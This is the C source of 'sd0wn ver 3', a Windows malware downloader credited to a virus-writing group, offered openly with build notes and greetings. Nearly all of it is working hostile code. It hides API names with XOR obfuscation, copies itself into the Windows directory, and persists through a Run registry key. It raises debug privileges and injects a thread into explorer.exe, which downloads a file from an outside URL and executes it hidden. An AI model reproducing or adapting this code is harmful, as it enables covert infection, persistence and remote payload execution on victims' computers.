/*
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS 
FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE 
COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, 
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES 
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, 
STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING 
IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE. 
*/

//sd0wn ver 3
//Compile it with msvc 6.0 or with free PellesC compiler

//Author  : Nibble/EOF
//Site    : http://nibbl3.host.sk/
//Mail    : dark_bera@hotmail.com
//EOF site: http://www.eof-project.net/
//Greetz  : All EOF members (A - Z):

//* - this means special greeting :))

//+-------------------+
//|Berniee/Fakedminded|
//|*izee              +-hello my diar friend
//|RadiatioN          |
//|*SkyOut            +-thx for accepting me in the group
//|Sk0r/Czybik        |
//|WarGame            |
//+-------------------+

//other greetz:Dia,dref,genetix

//Things that you must read are:
//"Running Arbitrary Code inside Remote Processes"
//By vnet576@hotmail.com
//and ofcoz go to http://www.governmentsecurity.org/
//to see & download a lot of examples about process injecting
//Sorry for bad english and some mistakes that I made in coding
//includes
#include <windows.h>
#include <wininet.h>
//if you are compiling with msvc 6.0 
//#include "small.h"

//Functions skeletons
typedef HMODULE  (__stdcall *Getm)(LPCTSTR);
//GetModuleHandle
typedef HWND     (__stdcall *Finw)(LPCTSTR,LPCTSTR);
//FindWindow 
typedef DWORD    (__stdcall *Getw)(HWND,LPDWORD);
//GetWindowThreadProcessId
typedef HANDLE   (__stdcall *Open)(DWORD,BOOL,DWORD);
//OpenProcess
typedef BOOL     (__stdcall *Vfex)(HANDLE,LPVOID,DWORD,DWORD);
//VirtualFreeEx
typedef LPVOID   (__stdcall *Vaex)(HANDLE,LPVOID,DWORD,DWORD,DWORD);
//VirtualAllocEx
typedef BOOL     (__stdcall *Vife)(HANDLE,LPVOID,DWORD,DWORD);
//VirtualFreeEx
typedef BOOL     (__stdcall *Vprm)(HANDLE,LPVOID,LPVOID,DWORD,LPDWORD);
//WriteProcessMemory
typedef HANDLE   (__stdcall *Crth)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
//CreateRemoteThread
typedef void     (__stdcall *Exit)(DWORD);
//ExitThread
typedef void     (__stdcall *Zero)(PVOID,DWORD);
//ZeroMemory
typedef void     (__stdcall *Slee)(DWORD);
//Sleep
typedef HANDLE   (__stdcall *Crea)(LPSECURITY_ATTRIBUTES,BOOL,LPCTSTR); 
// CreateMutex
typedef DWORD    (__stdcall *Gtle)(void);
//GetLastError
typedef HMODULE  (__stdcall *Ghma)(LPCTSTR); 
//GetModuleHandle
typedef DWORD    (__stdcall *Gmfn)(HMODULE,LPTSTR,DWORD); 
//fGetModuleFileN
typedef UINT     (__stdcall *Gwdi)(LPSTR,UINT); 
//GetWindowsDirectory
typedef BOOL     (__stdcall *Cpfi)(LPCTSTR,LPCTSTR,BOOL); 
//CopyFile
typedef HANDLE   (__stdcall *Cref)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
//CreateFile
typedef BOOL     (__stdcall *Wref)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
//WriteFile
typedef void     (__stdcall *Extt)(DWORD);
//ExitThread
typedef LONG     (__stdcall *RegK)(HKEY,LPCTSTR,PHKEY); 
//RegCreateKey
typedef LONG     (__stdcall *RegS)(HKEY,LPCTSTR,DWORD,DWORD,LPCTSTR,DWORD);
//RegSetValueEx
typedef LONG     (__stdcall *RegC)(HKEY); 
//fRegCloseKey
typedef LONG     (__stdcall *RegO)(HKEY,LPSTR,DWORD,REGSAM,PHKEY); 
//fRegOpenKeyEx
typedef LONG     (__stdcall *RegQ)(HKEY,LPSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD); 
//fRegQueryValueEx;
typedef BOOL     (__stdcall *Look)(LPCTSTR,LPCTSTR,PLUID);
//LookupPrivilegeValue
typedef BOOL     (__stdcall *APrv)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
//AdjustTokenPrivileges
typedef HANDLE   (__stdcall *GetP)(VOID);
//GetCurrentProcess
typedef BOOL     (__stdcall *Optk)(HANDLE,DWORD,PHANDLE);
//OpenProcessToken
typedef BOOL     (__stdcall *IChe)(LPCSTR,DWORD,DWORD);
//InternetCheckConnection
typedef HINTERNET(__stdcall *Inop)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
//InternetOpen
typedef HINTERNET(__stdcall *Inou)(HINTERNET,LPCSTR,LPCSTR,DWORD,DWORD,DWORD);
//InternetOpenUrl
typedef BOOL     (__stdcall *IRef)(HINTERNET,LPVOID,DWORD,LPDWORD);
//InternetReadFile
typedef DWORD    (__stdcall *Shee)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPSTR,int); 
//ShellExecute
typedef BOOL     (__stdcall *Clos)(HANDLE);
//CloseHanlde
typedef BOOL     (__stdcall *Cloi)(HINTERNET);
//InternetCloseHandle

#define cryptkey  1 
#define sleeptime 8000; 
//how long do we sleep and check inet connection
#define checksite "http://update.microsoft.com/" 
//if we can connect to this site than we are online :)
#define mtxname   "sd0wn2"
//mutex name
#define regkey    "Software\\sd0wn2"
//save download info here
#define downfile  "http://www.white-scorpion.nl/programs/tiny3.2.zip"
//download this file
#define savepath  "C:\\test.zip"
// & save it

//Declare Apis
Getm fGetModuleHandle;
Finw fFindWindow;
Getw fGetWindowId;
Open fOpenProcess;
Vfex fVirtualFreeEx;
Vaex fVirtualAllocEx;
Vprm fWriteProcessMem;
Crth fCreateRemoteThr;
Exit fExitThread;
Zero fZeroMemory;
GetP fGetCurrentProc;
Slee fSleep;
Crea fCreateMutex;
Gtle fGetLastError;
Ghma fGetModuleHandle;
Gmfn fGetModuleFileN;
Gwdi fGetWinDir;
Cpfi fCopyFile;
Cref fCreateFile;
IRef fInternetReadFile;
Wref fWriteFile;
Extt fExitThread;
Clos fCloseHandle;
Cloi fInternetCloseH;

Look fLookupPrivilege;
APrv fAdjustPrivilege;
Optk fOpenProcToken;
RegK fRegCreateKey;
RegS fRegSetValueEx;
RegC fRegCloseKey;
RegO fRegOpenKeyEx;
RegQ fRegQueryValueEx;

IChe fInetCheckConn;
Inop fInternetOpen;
Inou fInternetOpenUrl;

Shee fShellExecute;

char sbuff[MAX_PATH];

HKEY hKey,hOpenkey;

/*Variable Struct
This structure will contain
all addresses of apis
It will be injected in 
explorer.exe
*/

typedef struct _InjS
{
 
 DWORD  dwCreateMutex;
 DWORD  dwGetLastError;
 DWORD  dwExitThread;
 DWORD  dwVirtualFreeEx;
 DWORD  dwICheckConn;
 DWORD  dwSleep;
 DWORD  dwInternetOpen;
 DWORD  dwInternetOpenUrl;
 DWORD  dwCreateFile;
 DWORD  dwInternetReadFile;
 DWORD  dwWriteFile;
 DWORD  dwShellExecute;
 DWORD  dwCloseHandle;
 DWORD  dwInternetCloseH;
 DWORD  dwRegCreateKey;
 DWORD  dwRegSetValueEx;
 DWORD  dwRegCloseKey;

 DWORD  stime;
 
 char  mtx       [7];
 char  site      [64]; 
 char  downsite  [64];
 char  spath     [64];
 char  regpath   [64];
 char  downloaded[11];
 char  ss        [2];

} InjS;

//I take dr3fs download function and I modified
//it little
DWORD __stdcall ThreadProc(InjS *Inj)
{
 HINTERNET hinternet,hurl;
 DWORD     readed_bytes,writed_bytes;
 HANDLE    hfile;
 char      bbuffer;

 //Point to apis from Inj struct
  FARPROC pCreateMutex     = (FARPROC)Inj->dwCreateMutex;
  FARPROC pGetLastError    = (FARPROC)Inj->dwGetLastError;
  FARPROC pExitThread      = (FARPROC)Inj->dwExitThread;
  FARPROC pICheckConn      = (FARPROC)Inj->dwICheckConn;
  FARPROC pSleep           = (FARPROC)Inj->dwSleep;
  FARPROC pInternetOpen    = (FARPROC)Inj->dwInternetOpen;
  FARPROC pInternetOpenUrl = (FARPROC)Inj->dwInternetOpenUrl;
  FARPROC pCreateFile      = (FARPROC)Inj->dwCreateFile;
  FARPROC pInternetReadFile= (FARPROC)Inj->dwInternetReadFile;
  FARPROC pWriteFile       = (FARPROC)Inj->dwWriteFile;
  FARPROC pShellExecute    = (FARPROC)Inj->dwShellExecute;
  FARPROC pCloseHandle     = (FARPROC)Inj->dwCloseHandle;
  FARPROC pInternetCloseH  = (FARPROC)Inj->dwInternetCloseH;
  FARPROC pRegCreateKey    = (FARPROC)Inj->dwRegCreateKey;
  FARPROC pRegSetValueEx   = (FARPROC)Inj->dwRegSetValueEx;
  FARPROC pRegCloseKey     = (FARPROC)Inj->dwRegCloseKey;

  //Check if there is inet connection
  //If not sleep 8 seconds and check again
  //else try to download file & execute it

  while(!pICheckConn(Inj->site,1, 0))pSleep(Inj->stime);
  
  //create mutex
  pCreateMutex(0,0,Inj->mtx);

  //cant run twice
  if(pGetLastError()==ERROR_ALREADY_EXISTS)
  {
   pExitThread(1);
   return 1; // :)
  }

  //Initializes an application's use of the Win32 Internet functions.(MSDN)
  hinternet=(void*)pInternetOpen("",INTERNET_OPEN_TYPE_DIRECT,0,0,0);
	
  if(!hinternet)return 1;//if error exit

  //This is a general function that an application can use to 
  //retrieve data over any of the protocols that 
  //the Win32 Internet functions support(MSDN)
  hurl=(void*)pInternetOpenUrl(hinternet,Inj->downsite,0,0,INTERNET_FLAG_RELOAD,0);
		
  if(!hurl)return 1;    //if error exit

  //You should know this api
  hfile=(void*)pCreateFile(Inj->spath,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	
  if(!hfile)return 1;   //if error exit

  //read from from file that we want to download and write data to disk
  while(pInternetReadFile(hurl,&bbuffer,1,&readed_bytes) && readed_bytes)
  {
   pWriteFile(hfile,&bbuffer,1,&writed_bytes,0);
  }
  //Close Handles
  pCloseHandle(hfile);

  pInternetCloseH(hurl);

  pInternetCloseH(hinternet);

  //Execute File
  pShellExecute(0,"open",Inj->spath,0,0,SW_HIDE);

  //Write to regkey string val Downloaded 1 becose we wont to download
  //same file for n times
  if(pRegCreateKey(HKEY_CURRENT_USER,Inj->regpath,&hKey) == ERROR_SUCCESS)
  {
   pRegSetValueEx(hKey,Inj->downloaded,0,REG_SZ,Inj->ss,sizeof(char));
   pRegCloseKey(hKey);
  }
 return 0; //exit
}
//We need this function to cactulate ThreadProc size
static void __declspec(naked)end(){} 

//Simple crypt function that I find on net(little modified)
char *crypt(char *str)
{
 unsigned char i;
 unsigned int size;

 size = lstrlen(str); //size of str

 lstrcpy(sbuff,str); //copy it to sbuff

 if (cryptkey && size < MAX_PATH) //if crypt key != 0 and size < MAX_PATH then
 {
  for (i = 0; i < size; i++)  //loop while i < size of str
    sbuff[i] = sbuff[i] ^ (cryptkey + (i * (cryptkey % 10) + 1)); 
    //xor curr char with (sum of cryptkey and i) multiplied by (cryptkey 
    // and 10 remainder) +1
    //
 }
 return sbuff; //return sbuff
}

//change the privileges of our process using the LUID of SE_DEBUG_NAME
BOOL RaisePrivleges(HANDLE hToken,char *pPriv)
{
 TOKEN_PRIVILEGES tkp;
 int iRet;

  tkp.PrivilegeCount              = 1;
  tkp.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;
  tkp.Privileges[0].Luid.HighPart = 0;
  tkp.Privileges[0].Luid.LowPart  = 0;

  if(!fLookupPrivilege(0,pPriv,&tkp.Privileges[0].Luid))
    return FALSE;

  iRet = fAdjustPrivilege(hToken,FALSE,&tkp,0x10,(PTOKEN_PRIVILEGES)0,0);
 
  return !iRet?TRUE:FALSE;
}

int main() 
{
 char curpath[MAX_PATH];
 char windir [MAX_PATH];
 char isdwnd [2];

 unsigned long dwThreadId;
 unsigned long dwThrSize;
 unsigned long pid;
 unsigned long issize = sizeof(isdwnd);

 void *pRemoteThread,*hProcess,*hCurrentProc,*hToken;
 
 HINSTANCE kernel32,user32,advapi32,wininet,shell32;
 HWND window;

 InjS InjL,*pInjL;

  //Load Libraries
  kernel32 = LoadLibrary(crypt("ifvkck;;$o`a"));
  user32   = LoadLibrary(crypt("wpaw55&mfg"));
  advapi32 = LoadLibrary(crypt("cgrdvn;;$o`a"));
  wininet  = LoadLibrary(crypt("ujjlhb|'ng`"));
  shell32  = LoadLibrary(crypt("qkaij4:'ng`"));

  //kernel32 Apis
  fGetModuleHandle  = (Getm)GetProcAddress(kernel32,crypt("EfpHic}eoCmcjcuP"));
  fOpenProcess      = (Open)GetProcAddress(kernel32,crypt("MsakVugjox"));
  fVirtualFreeEx    = (Vfex)GetProcAddress(kernel32,crypt("TjvqsfdOxniHv"));
  fVirtualAllocEx   = (Vaex)GetProcAddress(kernel32,crypt("TjvqsfdHfgcnKw"));
  fVirtualFreeEx    = (Vife)GetProcAddress(kernel32,crypt("TjvqsfdOxniHv"));
  fWriteProcessMem  = (Vprm)GetProcAddress(kernel32,crypt("UqmqcWzfin~Cj}~`j"));
  fCreateRemoteThr  = (Crth)GetProcAddress(kernel32,crypt("AqadrbZlgdxhZgbtsw"));
  fExitThread       = (Exit)GetProcAddress(kernel32,crypt("G{mqRozlko"));
  fZeroMemory       = (Zero)GetProcAddress(kernel32,crypt("Pwh_cugDofcw"));
  fGetCurrentProc   = (GetP)GetProcAddress(kernel32,crypt("EfpFsuzld\\aluba"));
  fSleep	        = (Slee)GetProcAddress(kernel32,crypt("Qoa`v"));
  fCreateMutex      = (Crea)GetProcAddress(kernel32,crypt("AqadrbE|~ntL"));
  fGetLastError     = (Gtle)GetProcAddress(kernel32,crypt("EfpIgt|Lxyc"));
  fGetModuleHandle  = (Ghma)GetProcAddress(kernel32,crypt("EfpHic}eoCmcjcuP"));
  fGetModuleFileN   = (Gmfn)GetProcAddress(kernel32,crypt("EfpHic}eoMeakAq|wR"));
  fGetWinDir        = (Gwdi)GetProcAddress(kernel32,crypt("EfpRoilf}xHd|jse}amT"));
  fCopyFile         = (Cpfi)GetProcAddress(kernel32,crypt("Alt|@ndlK"));
  fCreateFile       = (Cref)GetProcAddress(kernel32,crypt("AqadrbN`fnM"));
  fWriteFile        = (Wref)GetProcAddress(kernel32,crypt("UqmqcAaeo"));
  fExitThread       = (Extt)GetProcAddress(kernel32,crypt("G{mqRozlko"));
  fCloseHandle      = (Clos)GetProcAddress(kernel32,crypt("AokvcOigngi"));
  
  //advapi32 apis
  fLookupPrivilege  = (Look)GetProcAddress(advapi32,crypt("NlknswX{c}eakhuGsapW"));
  fAdjustPrivilege  = (APrv)GetProcAddress(advapi32,crypt("Cgnpus\\fanb]|ffx~vspe"));
  fOpenProcToken    = (Optk)GetProcAddress(advapi32,crypt("MsakVugjoxYadu"));
  fRegCreateKey     = (RegK)GetProcAddress(advapi32,crypt("PfcFtbi}o@itO"));
  fRegSetValueEx    = (RegS)GetProcAddress(advapi32,crypt("PfcVcs^hf~iHvN"));
  fRegCloseKey      = (RegC)GetProcAddress(advapi32,crypt("PfcFjh{lAnu"));
  fRegOpenKeyEx     = (RegO)GetProcAddress(advapi32,crypt("PfcJvbfBorIuO"));
  fRegQueryValueEx  = (RegQ)GetProcAddress(advapi32,crypt("PfcTsbzp\\j`xkJhP"));

  //user32 apis
  fFindWindow       = (Finw)GetProcAddress(user32  ,crypt("DjjaQnfme|M"));
  fGetWindowId      = (Getw)GetProcAddress(user32  ,crypt("EfpRoilf}_dkntA`|wpedQ}"));

  //wininet functions
  fInetCheckConn    = (IChe)GetProcAddress(wininet ,crypt("Kmp`tim}IcineL|vwaxvX"));
  fInternetOpen     = (Inop)GetProcAddress(wininet ,crypt("Kmp`tim}E{icO"));
  fInternetOpenUrl  = (Inou)GetProcAddress(wininet ,crypt("Kmp`tim}E{ic[}|P"));
  fInternetReadFile = (IRef)GetProcAddress(wininet ,crypt("Kmp`tim}XnmiHf|t"));
  fInternetCloseH   = (Cloi)GetProcAddress(wininet ,crypt("Kmp`tim}Igc~kGqvq"));
  
  fShellExecute     = (Shee)GetProcAddress(shell32 ,crypt("QkaijBpli~xhO"));

  //get current path
  fGetModuleFileN(fGetModuleHandle(NULL),curpath,MAX_PATH);

  //current path + \\sdown.exe
  fGetWinDir(windir,sizeof(windir));
  lstrcat(windir,"\\sd0wn2.exe");

  //if current path is different than windir + \\sdown2.exe
  //copy itself to windir and execute itself
  if(lstrcmp(curpath,windir))
  {
   fCopyFile(curpath,windir,TRUE);
   fShellExecute(0,"open",windir,0,0,SW_HIDE);
   return 1;
  }

  //autorun
  if(fRegCreateKey(HKEY_CURRENT_USER,crypt("QlbqqfzlVFen|`c~tgHBy|vmh@^kmRDLWr@TTAFDw~X@"),&hKey) == ERROR_SUCCESS)
  {
   fRegSetValueEx(hKey,"sdown",0,REG_SZ,windir,sizeof(windir));
   fRegCloseKey(hKey);
  }
  //if dowloaded val is 1 than exit
  //becose when sd0wn download file, it writes at regkey + Downloaded val "1" 
  if(fRegOpenKeyEx(HKEY_CURRENT_USER,regkey,0,KEY_ALL_ACCESS,&hOpenkey)==ERROR_SUCCESS)
  {
   if(fRegQueryValueEx(hOpenkey,"downloaded",0,0,(unsigned char*)isdwnd,&issize)==ERROR_SUCCESS)
   if(!lstrcmp(isdwnd,"1"))
     return 1;
  }
 
  //cactulate ThreadProc size
   dwThrSize = (DWORD)end - (DWORD)ThreadProc;
  //Explorer.exe's handle
  if((window = fFindWindow(crypt("qkaijX|{kr{cj"),0)) == NULL)
    return 1;
  //Get Explorer's pid
  fGetWindowId(window,&pid);
  //The GetCurrentProcess function returns a pseudohandle 
  //for the current process.(MSDN)
  hCurrentProc = fGetCurrentProc();

  if (fOpenProcToken(hCurrentProc,TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,&hToken))
    if(!RaisePrivleges(hToken,(char*)SE_DEBUG_NAME));
      //printf("Some Error");

  if(hToken)CloseHandle(hToken);

  //open the process so we can modify it
  if((hProcess = fOpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == NULL)
    return 1;

  //allocate free space in the process
  if((pRemoteThread = fVirtualAllocEx(hProcess,0,(SIZE_T)dwThrSize,
	   MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL)
    return 1;

  //Write our ThreadProc in that allocated space
  if(fWriteProcessMem(hProcess,pRemoteThread,&ThreadProc,dwThrSize,0) == 0)
    return 1;
   
  //Clean InjL
  fZeroMemory(&InjL,sizeof(InjS));

  //Fill Inj struct
  //Inj.dwApi			  = (DWORD)Address of Api function
  InjL.dwCreateMutex      = (DWORD)fCreateMutex;
  InjL.dwGetLastError     = (DWORD)fGetLastError;
  InjL.dwExitThread       = (DWORD)fExitThread;
  InjL.dwVirtualFreeEx    = (DWORD)fVirtualFreeEx;
  InjL.dwICheckConn       = (DWORD)fInetCheckConn;
  InjL.dwSleep            = (DWORD)fSleep;
  InjL.dwInternetOpen     = (DWORD)fInternetOpen;
  InjL.dwInternetOpenUrl  = (DWORD)fInternetOpenUrl;
  InjL.dwCreateFile       = (DWORD)fCreateFile;
  InjL.dwInternetReadFile = (DWORD)fInternetReadFile;
  InjL.dwWriteFile        = (DWORD)fWriteFile;
  InjL.dwShellExecute     = (DWORD)fShellExecute;
  InjL.dwCloseHandle      = (DWORD)fCloseHandle;
  InjL.dwInternetCloseH   = (DWORD)fInternetCloseH;
  InjL.dwRegCreateKey     = (DWORD)fRegCreateKey;
  InjL.dwRegSetValueEx    = (DWORD)fRegSetValueEx;
  InjL.dwRegCloseKey      = (DWORD)fRegCloseKey;
  //sleep time
  InjL.stime              = sleeptime;

  //copy data that we need in struct
  lstrcpy(InjL.site      ,checksite);
  lstrcpy(InjL.downsite  ,downfile );
  lstrcpy(InjL.spath     ,savepath );
  lstrcpy(InjL.mtx       ,mtxname  );
  lstrcpy(InjL.regpath   ,regkey   );
  lstrcpy(InjL.downloaded,"downloaded");
  lstrcpy(InjL.ss        ,"1");
  //InjL.ss[0] = '1';
  //InjL.ss[1] = '\0';
  
  //allocate free space for our struct
  if((pInjL =(InjS *)fVirtualAllocEx(hProcess,0,sizeof(InjS),MEM_COMMIT,PAGE_READWRITE)) == NULL)
    return 1;

  //Write our struct in that allocated space
  if((fWriteProcessMem(hProcess,pInjL,&InjL,sizeof(InjL),0)) == 0)
    return 1;
  //run injected function + our struct as argument
  if((fCreateRemoteThr(hProcess,0,0,(DWORD(__stdcall *)(void *))pRemoteThread,pInjL,0,&dwThreadId)) == NULL)
    return 1;
  
  //Free Libraries
  FreeLibrary(shell32);
  FreeLibrary(wininet);
  FreeLibrary(advapi32);
  FreeLibrary(user32);
  FreeLibrary(kernel32);
  //CloseHandle :)
  CloseHandle(hProcess);
 return 0;
}
